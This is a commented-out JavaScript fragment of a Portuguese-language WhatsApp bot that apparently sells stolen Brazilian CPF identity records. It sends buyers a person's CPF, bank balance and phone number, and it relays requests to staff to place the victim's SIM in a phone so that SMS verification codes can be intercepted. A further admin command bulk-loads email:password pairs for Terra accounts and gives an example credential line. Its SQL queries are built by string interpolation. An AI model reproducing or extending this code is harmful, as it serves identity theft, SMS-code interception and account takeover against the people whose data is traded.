        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.error('Error when sending: ', erro);
        //             })
        //             return

        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("🟠 ID_CPF_COMPRADO:") > -1) {

        //             Regex = new RegExp(/ID_CPF_COMPRADO:\d+/, 'igm')
        //             ID = Mensagem_Texto.match(Regex)
        //             console.log(ID)
        //             ID = ID.toString().replace(/[^0-9]/igm, "");
        //             console.log(ID)

        //             item = await DataBase_Better.prepare(`SELECT _rowid_,CPF,CADASTRADO,DATA,PUXADA,VALOR_PACOTE,QUANTIDADE_PACOTE,DATA_MS_INSERIDO FROM CPF_EXTRAORDINARIO_VENDIDOS WHERE _rowid_ = '${ID}'`).get();

        //             ID = item["rowid"]
        //             CPF = item["CPF"]
        //             CADASTRADO = item["CADASTRADO"]
        //             DATA = item["DATA"]
        //             TIPO = "EXTRAODINARIO"
        //             PUXADA = item["PUXADA"]
        //             if (PUXADA === "undefined") {
        //                 PUXADA = await Puxar_CPF(CPF)
        //                 await DataBase_Better.prepare(`UPDATE CPF_EXTRAORDINARIO_VENDIDOS SET PUXADA = '${PUXADA}' WHERE CPF = '${CPF}'`).run()
        //             }

        //             Texto_Usuario = `📜 *CPF COMPRADO* 📜

        // *CPF:* ${CPF}
        // *TIPO:* ${TIPO}
        // *CADASTRADO:* NÃO
        // *DATA:* 20/04
        // ${PUXADA}
        // `

        //             await client.sendText(Mensagem_From, Texto_Usuario).then(async (result) => {
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //             });
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("454353ID_CPF_COMPRADO:") > -1) {

        //             Regex = new RegExp(/ID_CPF_COMPRADO:\d+/, 'igm')
        //             ID = Mensagem_Texto.match(Regex)
        //             console.log(ID)
        //             ID = ID.toString().replace(/[^0-9]/igm, "");

        //             item = await DataBase_Better.prepare(`SELECT _rowid_,CPF,NOME,ANO_NASC,TIPO,SALDO,NOME_CELULAR,NUMERO_CELULAR,QUATRO_DIGITOS,PUXADA,DATA_MS_INSERIDO FROM CPF_VENDIDOS WHERE _rowid_ = '${ID}'`).get();

        //             ID = item["rowid"]
        //             CPF = item["CPF"]
        //             NOME = item["NOME"]
        //             ANO_NASC = item["ANO_NASC"]
        //             TIPO = item["TIPO"]
        //             SALDO = item["SALDO"]
        //             NOME_CELULAR = item["NOME_CELULAR"]
        //             NUMERO_CELULAR = item["NUMERO_CELULAR"]
        //             QUATRO_DIGITOS = item["QUATRO_DIGITOS"]
        //             PUXADA = item["PUXADA"]
        //             if (PUXADA === "undefined") {
        //                 PUXADA = await Puxar_CPF(CPF)
        //                 await DataBase_Better.prepare(`UPDATE CPF_VENDIDOS SET PUXADA = '${PUXADA}' WHERE CPF = '${CPF}'`).run()
        //             }
        //             SALDO = parseFloat(SALDO).toFixed(2)
        //             PRECO = parseFloat(SALDO) / 2
        //             PRECO_MATERIAL = parseFloat(PRECO).toFixed(2)

        //             Texto_Usuario = `📜 *CPF COMPRADO* 📜

        // 💰 *VALOR CPF:* R$:${PRECO_MATERIAL}

        // 🔑*CPF:* ${CPF}
        // ⚜️ *TIPO:* ${TIPO}
        // 💠 *SALDO DISPONIVEL:* R$:${SALDO}
        // 📞*CELULAR:* ${NUMERO_CELULAR}

        // ${PUXADA}
        // `

        //             iD_Footer = Date.now()
        //             await client.sendListMessage(Mensagem_From, {
        //                 buttonText: 'RECEBER SMS',
        //                 description: Texto_Usuario,
        //                 sections: [
        //                     {
        //                         title: "Escolha a opção desejada.",
        //                         rows: [
        //                             {
        //                                 rowId: `${iD_Footer.toString()}|`,
        //                                 title: "❗ PRECISO DO CÓDIGO QUE CHEFARÁ NO SMS ❗",
        //                                 description: `Solicite que a equipe deixe o CHIP disponível para receber SMS. ID_CPF_HISTORICO:${ID}`,
        //                             }
        //                         ]
        //                     },
        //                 ],
        //             }).then(async (result) => {
        //                 await DataBase_Better.prepare(`UPDATE CONTATOS SET ID_BOTAO = '${iD_Footer.toString()}|0' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.error('Error when sending: ', erro);
        //             })
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("❗ PRECISO DO CÓDIGO QUE CHEFARÁ NO SMS ❗") > -1) {

        //             Texto = `Aguarde que nossa equipe está posicionando e preparando seu CHIP para recebimento do SMS.

        // Em menos de meia hora iremos lhe notificar que o CHIP do número vinculado ao CPF, estára pronto para receber o Código no SMS.`
        //             await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //             });

        //             Regex = new RegExp(/ID_CPF_HISTORICO:\d+/, 'igm')
        //             ID = Mensagem_Texto.match(Regex)
        //             console.log(ID)
        //             ID = ID.toString().replace(/[^0-9]/igm, "");

        //             item = await DataBase_Better.prepare(`SELECT _rowid_,CPF,NOME,ANO_NASC,TIPO,SALDO,NOME_CELULAR,NUMERO_CELULAR,QUATRO_DIGITOS,PUXADA,DATA_MS_INSERIDO FROM CPF_VENDIDOS WHERE _rowid_ = '${ID}'`).get();

        //             ID = item["rowid"]
        //             CPF = item["CPF"]
        //             NOME = item["NOME"]
        //             ANO_NASC = item["ANO_NASC"]
        //             TIPO = item["TIPO"]
        //             SALDO = item["SALDO"]
        //             NOME_CELULAR = item["NOME_CELULAR"]
        //             NUMERO_CELULAR = item["NUMERO_CELULAR"]
        //             QUATRO_DIGITOS = item["QUATRO_DIGITOS"]
        //             PUXADA = item["PUXADA"]
        //             SALDO = parseFloat(SALDO).toFixed(2)
        //             PRECO = parseFloat(SALDO) / 2
        //             PRECO_MATERIAL = parseFloat(PRECO).toFixed(2)

        //             Texto = `O arrombado, coloca o CHIP do número ${NUMERO_CELULAR} no celular, olha o restante das informações: ${NUMERO_CELULAR}`
        //             await client.sendText(`${Numero_Suporte_CPF}@c.us`, Texto).then(async (result) => {
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //             });
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳




        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("👥 REFERÊNCIAS") > -1) {

        //             Array_Lista = []

        //             ID_USERS = await DataBase_Better.prepare(`SELECT ID_CONTATO FROM CONTATOS`).all()
        //             for await (ID_USER of ID_USERS) {

        //                 TOTAL = await DataBase_Better.prepare(`SELECT * FROM CPF_EXTRAORDINARIO_VENDIDOS WHERE NUMERO_COMPRADOR = '${ID_USER["ID_CONTATO"]}'`).all()
        //                 console.log(TOTAL.length)

        //                 NOME = await DataBase_Better.prepare(`SELECT NOME FROM CONTATOS WHERE ID_CONTATO = '${ID_USER["ID_CONTATO"]}'`).get()["NOME"]
        //                 console.log(NOME)

        //                 PIXINSERIDOS = await DataBase_Better.prepare(`SELECT SUM(CAST(VALOR as FLOAT)) FROM PIX_COPIA_COLA WHERE PROCESSADO = 1 AND NUMERO_QUEM_GEROU = '${ID_USER["ID_CONTATO"]}'`).get()["SUM(CAST(VALOR as FLOAT))"]
        //                 PIXINSERIDOS = parseFloat(PIXINSERIDOS).toFixed(2);
        //                 if (PIXINSERIDOS === "NaN") {
        //                     PIXINSERIDOS = "Não inseriu Pix ainda."
        //                 } else {
        //                     PIXINSERIDOS = `R$:${PIXINSERIDOS}`
        //                 }
        //                 console.log(PIXINSERIDOS)

        //                 if (TOTAL.length > 0) {
        //                     So_Numero = (ID_USER["ID_CONTATO"]).replace(/\@c\.us/igm, '');
        //                     Array_Lista.push(`*${NOME}* - wa.me/${So_Numero}
        // COMPROU: ${TOTAL.length} CPFs NO TOTAL DE: ${PIXINSERIDOS}`)
        //                 }
        //             }

        //             Texto = `${Array_Lista.join("\n\n")}`
        //             await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //             });
        //             return;
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳







        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 







        //addemailterra===EMAIL:SENHA
        //addemailterra===narutovisk@terra.com:sasuke123
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if (Mensagem_Texto.indexOf("/addemailterra===") > -1 && Adms.includes(Numero)) {

        //             Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
        //             msg = Mensagem_Texto.split("===")

        //             if (msg[1] === "") {
        //                 Texto = `Comando inválido`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }
        //             if (msg[2] === "") {
        //                 Texto = `Comando inválido`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }
        //             if (msg[3] === "") {
        //                 Texto = `Comando inválido`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }

        //             Mensagem_Texto = Mensagem_Texto.replace(/\'/igm, "")

        //             Array_Fila_Espera = []
        //             try {
        //                 await client.sendText(Mensagem_From, "ABASTECENDO EMAILs...").then(async (result) => {

        //                     Linhas = Mensagem_Texto.split("\n")
        //                     try {
        //                         Contagem_Abastecidas = 0

        //                         db = new sqlite3.Database(Diretorio_SQLITE_Principal);
        //                         db.serialize(async function () {
        //                             db.run("begin transaction");

        //                             for (var index = 0; index < Linhas.length; index++) {
        //                                 try {

        //                                     Abastecendo = true

        //                                     Linha = Linhas[index].replace(/\/addemailterra\=\=\=/igm, '');

        //                                     console.log(`Inserindo: ${Linha}`)

        //                                     Div_Credencial = Linha.split(":")

        //                                     EMAIL = Div_Credencial[0]
        //                                     SENHA = Div_Credencial[1]
        //                                     PROVEDOR = "TERRA"
        //                                     DATA_MS_INSERIDO = Date.now()

        //                                     db.run(`INSERT INTO EMAIL (EMAIL,SENHA,PROVEDOR,DATA_MS_INSERIDO) VALUES ('${EMAIL}','${SENHA}','${PROVEDOR}','${DATA_MS_INSERIDO}') ON CONFLICT DO NOTHING`);
        //                                     Contagem_Abastecidas = parseInt(Contagem_Abastecidas) + 1
        //                                 } catch (error) {
        //                                     console.log(error)

        //                                     for await (adm of Adms) {
        //                                         Texto = `*Ocorreu algum problema no abastecimento.*

        // Já tinha abastecido ${Contagem_Abastecidas}.

        // Erro: ${error}`
        //                                         await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                                             Abastecendo = false
        //                                             return
        //                                         }).catch(async(erro) => {
        //                                             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                                         });
        //                                     }
        //                                     return
        //                                 }
        //                             }

        //                             if (Contagem_Abastecidas != 0) {
        //                                 console.log("comitando")
        //                                 db.run("commit");
        //                             }

        //                             for await (adm of Adms) {
        //                                 Texto = `*ABASTECIMENTO FINALIZADO*

        // ${Linhas.length} EMAILs Extra Colocados para abastecimento.

        // ${Contagem_Abastecidas} EMAILs Extra Abastecidas.
        // `, `${adm}@c.us`
        //                                 await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                                 }).catch(async(erro) => {
        //                                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                                 });
        //                             }
        //                             Abastecendo = false
        //                             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                         });
        //                     } catch (error) {
        //                         Texto = `Erro === ${error}`
        //                         await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                         }).catch(async(erro) => {
        //                             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                         });
        //                     }
        //                 })
        //                     .catch((error) => { console.log(debugLine("Error when sending = " + (JSON.stringify(error)))); });
        //             } catch (error) {
        //                 Texto = `Erro === ${error}`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }
        //             return
        //         }
